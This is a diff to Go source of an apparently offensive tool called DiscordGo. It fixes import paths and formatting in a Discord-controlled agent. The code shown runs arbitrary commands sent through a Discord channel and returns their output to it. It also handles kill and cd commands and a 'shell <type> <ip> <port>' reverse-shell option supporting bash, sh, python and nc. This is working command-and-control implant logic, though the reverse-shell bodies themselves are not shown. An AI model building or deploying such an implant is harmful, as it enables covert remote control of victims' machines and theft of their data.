@@ -14,10 +14,10 @@ import (
 	"syscall"
 	"time"
 
-	"DiscordGo/pkg/agent"
-	"DiscordGo/pkg/message"
-	"DiscordGo/pkg/util"
-	"DiscordGo/pkg/util/constants"
+	"github.com/emmaunel/DiscordGo/pkg/agent"
+	"github.com/emmaunel/DiscordGo/pkg/message"
+	"github.com/emmaunel/DiscordGo/pkg/util"
+	"github.com/emmaunel/DiscordGo/pkg/util/constants"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -126,7 +126,6 @@ func main() {
 	dg.Close()
 
 }
-
 
 func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 
@@ -293,14 +292,14 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 			} else if message.Content == "kill" {
 				dg.ChannelDelete(channelID.ID)
 				os.Exit(0)
-			} else if strings.Contains(message.Content, "cd"){ // TODO: 
+			} else if strings.Contains(message.Content, "cd") { // TODO:
 				commandBreakdown := strings.Fields(message.Content)
 				os.Chdir(commandBreakdown[1])
-				dg.ChannelMessageSend(message.ChannelID,  "```Directory changed to " + commandBreakdown[1] + "```")
-			} else if strings.Contains(message.Content, "shell"){
+				dg.ChannelMessageSend(message.ChannelID, "```Directory changed to "+commandBreakdown[1]+"```")
+			} else if strings.Contains(message.Content, "shell") {
 				splitCommand := strings.Fields(message.Content)
 				if len(splitCommand) == 1 {
-					dg.ChannelMessageSend(message.ChannelID,  "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell python 127.0.0.1 69696\n Shell type: bash, sh, python and nc```")
+					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell python 127.0.0.1 69696\n Shell type: bash, sh, python and nc```")
 				} else if len(splitCommand) == 4 {
 					shelltype := splitCommand[1]
 					if shelltype == "bash" {
@@ -334,10 +333,10 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 					} else if shelltype == "nc" {
 
 					} else {
-						dg.ChannelMessageSend(message.ChannelID,  "```Not a supported shell type```")
+						dg.ChannelMessageSend(message.ChannelID, "```Not a supported shell type```")
 					}
 				} else {
-					dg.ChannelMessageSend(message.ChannelID,  "``` Incomplete command ```")
+					dg.ChannelMessageSend(message.ChannelID, "``` Incomplete command ```")
 				}
 			} else {
 				output := executeCommand(message.Content)
@@ -346,10 +345,10 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 				} else if len(output) > 2000 {
 					firsthalf := output[:1900]
 					otherhalf := output[1900:]
-					dg.ChannelMessageSend(message.ChannelID,  "```" + firsthalf + "```")
-					dg.ChannelMessageSend(message.ChannelID,  "```" + otherhalf + "```")
+					dg.ChannelMessageSend(message.ChannelID, "```"+firsthalf+"```")
+					dg.ChannelMessageSend(message.ChannelID, "```"+otherhalf+"```")
 				} else {
-					dg.ChannelMessageSend(message.ChannelID,  "```" + output + "```")
+					dg.ChannelMessageSend(message.ChannelID, "```"+output+"```")
 				}
 			}
 		}
